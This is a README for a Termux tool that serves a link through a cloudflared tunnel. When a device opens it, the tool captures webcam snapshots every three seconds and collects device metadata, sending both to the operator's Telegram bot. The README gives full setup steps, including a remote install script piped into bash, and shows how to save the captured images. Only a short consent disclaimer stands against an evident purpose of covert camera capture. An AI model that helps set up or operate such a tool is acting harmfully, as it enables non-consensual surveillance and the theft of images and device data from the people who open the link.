# I catch you bot : Remotely access camera snapshots and device metadata from any connected device through a secure host link by a telegram bot.

This project launches a simple web interface that:
- Captures webcam images every 3 seconds.
- Collects device metadata like battery, network, browser, OS info, etc.
- Sends all data to a local Python Flask server then to the telegram bot.

---

## 📱 Installation on Termux (Android)

### Step 1: Update packages and install git

```bash
pkg update
```
```
pkg upgrade -y
```
```
pkg install git -y
```

### Step 2: Install the project using this command

```
bash <(curl -s https://raw.githubusercontent.com/aissaboukortt/I-catch-you-Bot/main/install.sh)
```

> This will:

Clone the project from GitHub

Install Python and Flask

Create required folders (images, metadata)

Install cloudflared if not present




### Step 3: setting up the bot
for that you sohld open the text editor in termux by writing the command 
```

cd ~/cam-capture
```
and after that writing 
```
nano bot.py
```
and then you need to replace the sentence "THE BOT TOKEN" by your bot' token Which you'll find it in the bot settings and replace the chat id by your id then press CTRL +X -y and enter

### Step 4: Starting the bot server 
All what you have to do is sending the command 
```

python bot.py
```


---

## 📂 Output

Captured images and device metadata are saved to the cam-capture stay saving on a folder on termux to copy them into internal storage use 
### First: allow termux to access storage using:
```
termux-setup-storage
```
### Second: Create the cam-capture folder using 
```
mkdir -p /sdcard/cam-capture/sent
```
```
mkdir -p /sdcard/cam-capture/infos_sent
```
## Copying to internal storage:
### For images:
```
cp ~/cam-capture/images/*.png /sdcard/cam-capture/sent/
```
### For metadata:
```
cp ~/cam-capture/metadata/*.json /sdcard/cam-capture/infos_sent/
```
## Moving to internal storage:
### For images:
```
mv ~/cam-capture/images/*.png /sdcard/cam-capture/sent/
```
### For metadata:
```
mv ~/cam-capture/metadata/*.json /sdcard/cam-capture/infos_sent/
```

# Stop script:
```
CTRL+C
```


---

⚠️ Notes

This tool is for educational, testing, and internal network use only.

For live public use, please ensure user consent and legal compliance.
## 📝 License

This project is licensed under the [Apache License 2.0](LICENSE) © 2026 Aïssa Boukortt.
